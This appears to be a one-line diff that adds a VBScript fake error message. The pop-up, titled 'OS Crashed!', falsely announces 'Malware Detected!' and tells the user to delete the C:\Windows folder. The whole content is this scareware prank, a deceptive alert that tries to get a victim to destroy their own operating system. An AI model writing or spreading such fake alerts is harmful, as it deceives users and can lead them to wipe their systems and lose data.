@@ -1,0 +1,1 @@
+x=Msgbox("Malware Detected! Please delete the folder C:\Windows.",16+0,"OS Crashed!")
